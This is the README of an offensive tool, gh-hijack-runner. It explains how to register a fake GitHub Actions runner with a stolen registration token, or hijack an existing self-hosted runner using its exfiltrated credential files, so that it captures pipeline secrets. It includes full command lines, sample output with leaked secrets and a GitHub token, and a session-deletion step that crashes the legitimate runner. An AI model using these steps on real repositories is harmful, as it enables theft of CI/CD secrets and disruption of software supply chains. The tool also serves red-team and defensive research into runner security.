# gh-hijack-runner

A python script to create a fake GitHub runner and hijack pipeline jobs to leak CI/CD secrets.

## Exploitation

If you can obtain a registration token or achieve remote code execution on a self-hosted GitHub runner, you can either create or take over a GitHub runner. This will enable you to access all the secrets passed to that runner.

Using a registration token, you can register a runner labeled `ubuntu-latest`, gaining access to jobs originally intended for GitHub-provisioned runners. This allows you to compromise any workflow using this method.

```shell
$ gh-hijack-runner.py --registration-token AOTAA3QWE1A5QB6JFECOKQDGEVOVC --url https://github.com/syncicd/CICD --labels ubuntu-latest
[+] Session ID: b66b76a8-e7db-4a14-a2ea-207b1c8cb94d
[+] AES key: BTIk+FT2hRb[...]HN1kkg==
[+] New Job: init (messageId=2)
- REPO_SECRET: repo secret
- SUPER_SECRET: super secret password
- system.github.token: ghs_RqDY21GqZ0OYvM8ImVpAB0B9o7TBQR4Dq2HC
```

## Install

```sh
$ pip install -r requirements.txt 
```

## Usage

### From a registration token

If you manage to get a registration token to register a self-hosted runner for a repo or an organization you can register the fake GitHub runner with this command:

```shell
$ gh-hijack-runner.py --registration-token AOTAA3QWE1A5QB6JFECOKQDGEVOVC --url https://github.com/syncicd/CICD --labels ubuntu-latest
```

This can be an organization or repository registration token.

### From credentials of an existing GitHub runner

With arbitrary code execution on a self-hosted runner, you need to exfiltrate three files to assume the identity of the compromised runner:
```shell
root@9f8f6f1fdfa6:/actions-runner# pwd
/actions-runner
root@9f8f6f1fdfa6:/actions-runner# ll
-rw-r--r-- 1 root   root     266 Apr 21 12:27 .credentials
-rw------- 1 root   root    1667 Apr 21 12:27 .credentials_rsaparams
-rw-r--r-- 1 root   root     325 Apr 21 12:27 .runner
[...]
```

To fetch jobs, the runner will establish a session with GitHub. Each runner can only maintain one session. To create a new session, you need to delete the current session established by the legitimate runner. The session ID can be found here:
```shell
root@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session
[...]
[2024-04-21 18:03:46Z INFO MessageListener] Message '5' received from session 'aab007e0-eedd-4c1b-96b4-a7c2c128c31a'.
```

**/!\\ Deleting the current session will crash the legitimate runner /!\\**

Then, you can delete the current session:
```sh
$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a
[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a deleted.
```

Finally you can hijack this runner:
```sh
$ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json                                                         
[+] Session ID: 3c88c6f7-5764-4121-b9bf-2536ee2539b7
[+] AES key: eLN3rhf3D[...]UHewLw==
[+] New Job: init (messageId=2)
- REPO_SECRET: repo secret
- SUPER_SECRET: super secret password
- system.github.token: ghs_RqDY23GqZ0OYvM8ImVpAB0B9o7TBQR4Dq2HC
```

Note that for ephemeral self-hosted runner this won't work.

### Help

```sh
$ gh-hijack-runner.py --help
Hijack GitHub runners                

Usage:
    gh-hijack-runner.py [options] --registration-token <token> --url <url> [--labels <labels> --ephemeral --rsa-params <rsa> --credentials <credentials> --runner <runner>]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> [(--session-id <session> --aes-key <key>)]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> --delete-session-id <session>
    

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    --output <folder>                       Save data to output file
    --runer-name <name>                     Runner name
    --runner-group <name>                   Runner group name
    --last-Message-id <id>                  Last message ID

Args:
    --registration-token <token>            Token used to register a runner
    --url <url>                             Full repository or org URL
    --rsa-params <rsa>                      Path to .credentials_rsaparams file
    --credentials <credentials>             Path to .credentials file
    --runner <runner>                       Path to .runner file
    --session-id <session>                  Already running session id
    --aes-key <key>                         Base64 encoded AES key associated with a session id
    --labels <labels>                       Labels used for registration (ubuntu-latest,customrunner)
    --ephemeral                             Create ephemeral runner
    --delete-session-id <session>           Delete session. Warning: It will crash the related GitHub runner
    

Examples:
    $ gh-hijack-runner.py --registration-token AOTAA3TOI7SACAVKBDWEQN3F5IEO2 --url https://github.com/org/repo
    $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json

Author: @hugow

```

## Credits

- [@karimpwnz](https://twitter.com/karimpwnz) for the [crypto](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)
- [@0xn3va](https://twitter.com/0xn3va) for the [session deletion](https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions#misuse-of-self-hosted-runners) part
- [@frichette_n](https://twitter.com/frichette_n) for the [original idea](https://github.com/Frichetten/gitlab-runner-research) on GitLab
